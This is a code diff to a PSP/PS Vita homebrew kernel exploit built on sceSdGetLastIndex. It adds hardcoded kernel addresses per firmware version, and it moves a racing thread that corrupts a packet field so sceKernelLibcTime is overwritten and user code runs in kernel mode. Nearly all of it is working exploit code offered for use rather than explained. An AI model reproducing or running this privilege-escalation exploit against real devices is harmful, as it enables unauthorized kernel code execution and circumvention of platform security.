@@ -19,6 +19,7 @@
 #include <psploadexec.h>
 #include <psploadexec_kernel.h>
 #include <psputility_modules.h>
+#include <psputility_savedata.h>
 #include <module2.h>
 #include <rebootconfig.h>
 #include <systemctrl_se.h>
@@ -29,6 +30,15 @@
  sceSdGetLastIndex Kernel Exploit for PSP up to 6.60 and PS Vita up to 3.20, both PSP and PSX exploits
 */
 
+// Vita 3.20
+//#define LIBC_TIME_ADDR 0x8800F71C
+
+// PSP 6.60
+//#define LIBC_TIME_ADDR 0x8800F798
+
+// PSP 5.03
+#define LIBC_TIME_ADDR 0x0000F030
+
 UserFunctions* g_tbl;
 
 int (* _sceSdGetLastIndex)(int a1, int a2, int a3) = (void *)NULL;
@@ -37,26 +47,17 @@ int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;
 unsigned int (* _sceKernelCpuSuspendIntr)() = (void*)NULL;
 void (* _sceKernelCpuResumeIntr)(unsigned int flags) = (void*)NULL;
 
-void (* _sceKernelPowerLock)(u32) = (void*)NULL;
-
 int savedata_open = 0;
 
-u32 packet[256], is_exploited, libctime_addr=0x8800F71C;
+u32 packet[256], is_exploited, libctime_addr=LIBC_TIME_ADDR;
 
 void executeKernel(u32 kernelContentFunction)
 {
-    if (_sceKernelLibcTime == NULL)
-        _sceKernelPowerLock(kernelContentFunction | (u32)0x80000000);
-    else
-        _sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);
+    _sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);
 }
 
 void repairInstruction(KernelFunctions* k_tbl){
-    //Vita 2.61
-    if (_sceKernelLibcTime == NULL)
-        _sw(0x0040F809, 0x8800CB64);
-    else
-        _sw(0x8C654384, libctime_addr); // recover the damage we've done
+    _sw(0x8C654384, libctime_addr); // recover the damage we've done
 }
 
 void KernelFunction()
@@ -85,21 +86,25 @@ int stubScanner(UserFunctions* tbl){
     // the function we need to patch
     _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);
 
-    PRTSTR("Scanning powerlock");
-    if (_sceKernelLibcTime == NULL)
-        _sceKernelPowerLock = (void *)g_tbl->FindImportUserRam("sceSuspendForUser", 0xEADB1BD7);
-
     g_tbl->KernelDcacheWritebackAll();
 
     return (
         _sceKernelCpuSuspendIntr == NULL ||
         _sceKernelCpuResumeIntr == NULL ||
         _sceSdGetLastIndex == NULL ||
-        (
-            _sceKernelLibcTime == NULL &&
-            _sceKernelPowerLock == NULL
-        )
+        _sceKernelLibcTime == NULL
     );
+}
+
+// the threads that will make sceSdGetLastIndex vulnerable
+int qwik_thread()
+{
+    while (is_exploited != 1) {
+        packet[9] = libctime_addr - 18 - (u32)&packet;
+        g_tbl->KernelDelayThread(0);
+    }
+
+    return 0;
 }
 
 int doExploit()
@@ -107,26 +112,7 @@ int doExploit()
 
     PRTSTR("Attempting kernel exploit");
 
-    if (IS_PSP(g_tbl->config)){
-        libctime_addr = 0x8800F798;
-        PRTSTR("Kxploit in PSP mode");
-    }
-
     is_exploited = 0;
-
-    // the threads that will make sceSdGetLastIndex vulnerable
-    int qwik_thread()
-    {
-        while (is_exploited != 1) {
-            if (_sceKernelLibcTime == NULL)
-                packet[9] = 0x8800CB66 - 20 - (u32)&packet;
-            else
-                packet[9] = libctime_addr - 18 - (u32)&packet;
-            g_tbl->KernelDelayThread(0);
-        }
-
-        return 0;
-    }
 
     // we create the thread and constantly attempt the exploit
     SceUID qwikthread = g_tbl->KernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);
@@ -136,10 +122,7 @@ int doExploit()
         packet[9] = (u32)16;
         _sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
         g_tbl->KernelDelayThread(0);
-        if (_sceKernelLibcTime == NULL)
-            _sceKernelPowerLock((u32)&KernelFunction | (u32)0x80000000);
-        else
-            _sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
+        _sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
         g_tbl->KernelDcacheWritebackAll();
     }
 
